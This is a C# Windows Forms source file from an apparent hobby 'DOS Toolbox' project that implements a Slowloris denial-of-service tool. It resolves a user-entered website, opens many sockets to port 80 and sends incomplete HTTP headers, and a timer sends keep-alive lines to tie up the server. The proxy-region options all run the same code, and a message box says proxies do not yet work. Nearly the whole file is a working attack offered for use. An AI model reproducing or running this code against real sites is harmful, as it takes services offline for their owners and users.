//////////////////////////////////////////////
/// jack-debug, The DOS Toolbox 26/09/2020 ///
//////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using System.IO;

namespace The_DOS_Toolbox
{
    public partial class Slowloris : Form
    {
        public string pubhost; 
        private TcpClient client;
        public Slowloris()
        {
            InitializeComponent();
        }
        public static bool CheckForInternetConnection() // this checks for internet
        {
            try
            {
                using (var CheckClient = new WebClient())
                using (CheckClient.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            keepAliveTimer.Interval = Int32.Parse(keepAlive.Text);
            int sockets = Int32.Parse(socketAmount.Text);
            string website = websiteTxt.Text;
            string webip = GetWebIP(website); // this gets the websites ip address which is pretty good tbh
            pubhost = webip;
            OpenSockets(webip, sockets); // this opens up the sockers
            keepAliveTimer.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            keepAliveTimer.Stop();
        }

        private void keepAliveTimer_Tick(object sender, EventArgs e)
        {
            client.Client.Send(getBytes("thedostoolbox: thedostoolbox\r\n")); // this keeps connections alive
        }
        private void OpenSockets(string host, int sockets)
        {
            if (proxyStatus.Checked == true)
            {
                if (northAmerica.Checked == true)
                {
                    for (var i = 0; i < sockets; i++)
                    {
                        client = new TcpClient();
                        client.Client.Connect(host, 80);
                        while (true)
                        {
                            if (client.Connected) break;
                        }
                        string requestHeader = $"GET / HTTP/1.1\r\nHost: {host}\r\n"; // this is an incomplete http request
                        client.Client.Send(getBytes(requestHeader)); // this sends the previously mentioned http request
                    }
                }
                else if (asia.Checked == true)
                {
                    for (var i = 0; i < sockets; i++)
                    {
                        client = new TcpClient();
                        client.Client.Connect(host, 80);
                        while (true)
                        {
                            if (client.Connected) break;
                        }
                        string requestHeader = $"GET / HTTP/1.1\r\nHost: {host}\r\n";
                        client.Client.Send(getBytes(requestHeader));
                    }
                }
                else if (europe.Checked == true)
                {
                    for (var i = 0; i < sockets; i++)
                    {
                        client = new TcpClient();
                        client.Client.Connect(host, 80);
                        while (true)
                        {
                            if (client.Connected) break;
                        }
                        string requestHeader = $"GET / HTTP/1.1\r\nHost: {host}\r\n";
                        client.Client.Send(getBytes(requestHeader));
                    }
                }
                else if (southAmerica.Checked == true)
                {
                    for (var i = 0; i < sockets; i++)
                    {
                        client = new TcpClient();
                        client.Client.Connect(host, 80);
                        while (true)
                        {
                            if (client.Connected) break;
                        }
                        string requestHeader = $"GET / HTTP/1.1\r\nHost: {host}\r\n";
                        client.Client.Send(getBytes(requestHeader));
                    }
                }
                else if (australia.Checked == true)
                {
                    for (var i = 0; i < sockets; i++)
                    {
                        client = new TcpClient();
                        client.Client.Connect(host, 80);
                        while (true)
                        {
                            if (client.Connected) break;
                        }
                        string requestHeader = $"GET / HTTP/1.1\r\nHost: {host}\r\n";
                        client.Client.Send(getBytes(requestHeader));
                    }
                }
                else if (middleEast.Checked == true)
                {
                    for (var i = 0; i < sockets; i++)
                    {
                        client = new TcpClient();
                        client.Client.Connect(host, 80);
                        while (true)
                        {
                            if (client.Connected) break;
                        }
                        string requestHeader = $"GET / HTTP/1.1\r\nHost: {host}\r\n";
                        client.Client.Send(getBytes(requestHeader));
                    }
                }
                else
                {
                    MessageBox.Show("Please choose a proxy location before continuing.");
                }
            }
            else
            {
                for (var i = 0; i < sockets; i++)
                {
                    client = new TcpClient();
                    client.Client.Connect(host, 80);
                    while (true)
                    {
                        if (client.Connected) break;
                    }
                    string requestHeader = $"GET / HTTP/1.1\r\nHost: {host}\r\n";
                    client.Client.Send(getBytes(requestHeader));
                }
            }
        }
        private Byte[] getBytes(string message)
            => System.Text.Encoding.ASCII.GetBytes(message);
        private string GetWebIP(string website)
        {
            var url = website;
            Uri myUri = new Uri(url);
            var ip = Dns.GetHostAddresses(myUri.Host)[0];
            return Convert.ToString(ip);
        }

        private void proxyStatus_CheckedChanged(object sender, EventArgs e)
        {
            MessageBox.Show("Proxies are not properly implemented yet. Please wait for an update for proxies to work.");
        }
    }
}
